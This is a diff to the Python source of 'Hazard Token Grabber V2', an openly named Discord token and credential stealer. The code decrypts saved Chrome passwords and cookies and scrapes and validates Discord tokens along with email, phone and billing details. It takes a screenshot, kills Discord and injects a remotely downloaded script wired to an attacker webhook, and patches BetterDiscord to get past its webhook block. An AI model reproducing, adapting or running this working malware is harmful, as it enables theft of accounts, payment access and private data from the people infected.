@@ -1,13 +1,13 @@
 import requests
-import os 
-import shutil 
-import sqlite3 
-import zipfile 
-import json 
+import os
+import shutil
+import sqlite3
+import zipfile
+import json
 import base64 
-import psutil 
-import pyautogui
+import psutil
 
+from PIL import ImageGrab
 from win32crypt import CryptUnprotectData
 from re import findall
 from Crypto.Cipher import AES
@@ -26,9 +26,8 @@ class Hazard_Token_Grabber_V2:
             pass
 
         self.tokens = []
-        self.saved = []
 
-        if os.path.exists(os.getenv("appdata")+"\\BetterDiscord"):
+        if os.path.exists(self.roaming+"\\BetterDiscord"):
             self.bypass_better_discord()
 
         if not os.path.exists(self.appdata+'\\Google'):
@@ -38,11 +37,28 @@ class Hazard_Token_Grabber_V2:
             self.grabCookies()
         self.grabTokens()
         self.screenshot()
+        for i in ["Google Passwords.txt", "Google Cookies.txt", "Discord Info.txt"]:
+            if os.path.exists(self.tempfolder+os.sep+i):
+                with open(self.tempfolder+os.sep+i, "r", encoding="cp437") as f:
+                    x = f.read()
+                    if x != "":
+                        with open(self.tempfolder+os.sep+i, "w", encoding="cp437") as f:
+                            f.write("Made by Rdimo | https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")
+                        with open(self.tempfolder+os.sep+i, "a", encoding="cp437") as fp:
+                            fp.write(x)
+                            fp.write("Made by Rdimo | https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")
+                    else:
+                        f.close()
+                        try:
+                            os.remove(self.tempfolder+os.sep+i)
+                        except Exception:
+                            print("ok")
+
         self.SendInfo()
         self.LogOut()
         try:
             shutil.rmtree(self.tempfolder)
-        except (PermissionError, FileExistsError):
+        except (PermissionError, FileNotFoundError):
             pass
 
     def getheaders(self, token=None, content_type="application/json"):
@@ -59,7 +75,7 @@ class Hazard_Token_Grabber_V2:
             if any(procstr in proc.name().lower() for procstr in\
             ['discord', 'discordcanary', 'discorddevelopment', 'discordptb']):
                 proc.kill()
-        for root, dirs, files in os.walk(os.getenv("LOCALAPPDATA")):
+        for root, dirs, files in os.walk(self.appdata):
             for name in dirs:
                 if "discord_desktop_core-" in name:
                     try:
@@ -70,13 +86,13 @@ class Hazard_Token_Grabber_V2:
                     f = requests.get("https://raw.githubusercontent.com/Rdimo/Injection/master/Injection-clean").text.replace("%WEBHOOK_LINK%", self.webhook)
                     with open(directory_list, 'w', encoding="utf-8") as index_file:
                         index_file.write(f)
-        for root, dirs, files in os.walk(os.getenv("APPDATA")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc"):
+        for root, dirs, files in os.walk(self.roaming+"\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc"):
             for name in files:
                 discord_file = os.path.join(root, name)
                 os.startfile(discord_file)
 
     def bypass_better_discord(self):
-        bd = os.getenv("appdata")+"\\BetterDiscord\\data\\betterdiscord.asar"
+        bd = self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"
         with open(bd, "rt", encoding="cp437") as f:
             content = f.read()
             content2 = content.replace("api/webhooks", "RdimoTheGoat")
@@ -113,8 +129,6 @@ class Hazard_Token_Grabber_V2:
     
     def grabPassword(self):
         master_key = self.get_master_key()
-        f = open(self.tempfolder+"\\Google Passwords.txt", "w", encoding="cp437", errors='ignore')
-        f.write("Made by Rdimo | https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")
         login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Login Data'
         try:
             shutil.copy2(login_db, "Loginvault.db")
@@ -122,18 +136,18 @@ class Hazard_Token_Grabber_V2:
             pass
         conn = sqlite3.connect("Loginvault.db")
         cursor = conn.cursor()
-        try:
-            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
-            for r in cursor.fetchall():
-                url = r[0]
-                username = r[1]
-                encrypted_password = r[2]
-                decrypted_password = self.decrypt_password(encrypted_password, master_key)
-                if url != "":
-                    f.write(f"Domain: {url}\nUser: {username}\nPass: {decrypted_password}\n\n")
-        except:
-            pass
-        f.close()
+        with open(self.tempfolder+"\\Google Passwords.txt", "w", encoding="cp437", errors='ignore') as f:
+            try:
+                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+                for r in cursor.fetchall():
+                    url = r[0]
+                    username = r[1]
+                    encrypted_password = r[2]
+                    decrypted_password = self.decrypt_password(encrypted_password, master_key)
+                    if url != "":
+                        f.write(f"Domain: {url}\nUser: {username}\nPass: {decrypted_password}\n\n")
+            except:
+                pass
         cursor.close()
         conn.close()
         try:
@@ -143,8 +157,6 @@ class Hazard_Token_Grabber_V2:
 
     def grabCookies(self):
         master_key = self.get_master_key()
-        f = open(self.tempfolder+"\\Google Cookies.txt", "w", encoding="cp437", errors='ignore')
-        f.write("Made by Rdimo | https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")
         login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Network\\cookies'
         try:
             shutil.copy2(login_db, "Loginvault.db")
@@ -152,18 +164,18 @@ class Hazard_Token_Grabber_V2:
             pass
         conn = sqlite3.connect("Loginvault.db")
         cursor = conn.cursor()
-        try:
-            cursor.execute("SELECT host_key, name, encrypted_value from cookies")
-            for r in cursor.fetchall():
-                Host = r[0]
-                user = r[1]
-                encrypted_cookie = r[2]
-                decrypted_cookie = self.decrypt_password(encrypted_cookie, master_key)
-                if Host != "":
-                    f.write(f"Host: {Host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n")
-        except:
-            pass
-        f.close()
+        with open(self.tempfolder+"\\Google Cookies.txt", "w", encoding="cp437", errors='ignore') as f:
+            try:
+                cursor.execute("SELECT host_key, name, encrypted_value from cookies")
+                for r in cursor.fetchall():
+                    Host = r[0]
+                    user = r[1]
+                    encrypted_cookie = r[2]
+                    decrypted_cookie = self.decrypt_password(encrypted_cookie, master_key)
+                    if Host != "":
+                        f.write(f"Host: {Host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n")
+            except:
+                pass
         cursor.close()
         conn.close()
         try:
@@ -173,7 +185,6 @@ class Hazard_Token_Grabber_V2:
 
     def grabTokens(self):
         f = open(self.tempfolder+"\\Discord Info.txt", "w", encoding="cp437", errors='ignore')
-        f.write("Made by Rdimo | https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")
         paths = {
             'Discord': self.roaming + r'\\discord\\Local Storage\\leveldb\\',
             'Discord Canary': self.roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
@@ -208,61 +219,58 @@ class Hazard_Token_Grabber_V2:
                 for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                     for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                         for token in findall(regex, line):
-                            self.tokens.append(token)
-        for token in self.tokens:
-            r = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token))
-            if r.status_code == 200:
-                if token in self.saved:
-                    continue
-                self.saved.append(token)
-                j = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token)).json()
-                badges = ""
-                flags = j['flags']
-                if (flags == 1):
-                    badges += "Staff, "
-                if (flags == 2):
-                    badges += "Partner, "
-                if (flags == 4):
-                    badges += "Hypesquad Event, "
-                if (flags == 8):
-                    badges += "Green Bughunter, "
-                if (flags == 64):
-                    badges += "Hypesquad Bravery, "
-                if (flags == 128):
-                    badges += "HypeSquad Brillance, "
-                if (flags == 256):
-                    badges += "HypeSquad Balance, "
-                if (flags == 512):
-                    badges += "Early Supporter, "
-                if (flags == 16384):
-                    badges += "Gold BugHunter, "
-                if (flags == 131072):
-                    badges += "Verified Bot Developer, "
-                if (badges == ""):
-                    badges = "None"
+                            r = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token))
+                            if r.status_code == 200:
+                                if token in self.tokens:
+                                    continue
+                                self.tokens.append(token)
+                                j = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token)).json()
+                                badges = ""
+                                flags = j['flags']
+                                if (flags == 1):
+                                    badges += "Staff, "
+                                if (flags == 2):
+                                    badges += "Partner, "
+                                if (flags == 4):
+                                    badges += "Hypesquad Event, "
+                                if (flags == 8):
+                                    badges += "Green Bughunter, "
+                                if (flags == 64):
+                                    badges += "Hypesquad Bravery, "
+                                if (flags == 128):
+                                    badges += "HypeSquad Brillance, "
+                                if (flags == 256):
+                                    badges += "HypeSquad Balance, "
+                                if (flags == 512):
+                                    badges += "Early Supporter, "
+                                if (flags == 16384):
+                                    badges += "Gold BugHunter, "
+                                if (flags == 131072):
+                                    badges += "Verified Bot Developer, "
+                                if (badges == ""):
+                                    badges = "None"
 
-                user = j["username"] + "#" + str(j["discriminator"])
-                email = j["email"]
-                phone = j["phone"] if j["phone"] else "No Phone Number attached"
+                                user = j["username"] + "#" + str(j["discriminator"])
+                                email = j["email"]
+                                phone = j["phone"] if j["phone"] else "No Phone Number attached"
 
-                url = f'https://cdn.discordapp.com/avatars/{j["id"]}/{j["avatar"]}.gif'
-                try:
-                    requests.get(url)
-                except:
-                    url = url[:-4]
+                                nitro_data = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=self.getheaders(token)).json()
+                                has_nitro = False
+                                has_nitro = bool(len(nitro_data) > 0)
 
-                nitro_data = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=self.getheaders(token)).json()
-                has_nitro = False
-                has_nitro = bool(len(nitro_data) > 0)
-
-                billing = bool(len(json.loads(requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=self.getheaders(token)).text)) > 0)
-                
-                f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n[Avatar]({url})\n\n")
+                                billing = bool(len(json.loads(requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=self.getheaders(token)).text)) > 0)
+                                f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n\n")
         f.close()
 
     def screenshot(self):
-        image = pyautogui.screenshot()
+        image = ImageGrab.grab(
+            bbox=None, 
+            include_layered_windows=False, 
+            all_screens=False, 
+            xdisplay=None
+        )
         image.save(self.tempfolder + "\\Screenshot.png")
+        image.close()
 
     def SendInfo(self):
         ip = country = city = region = googlemap = "None"
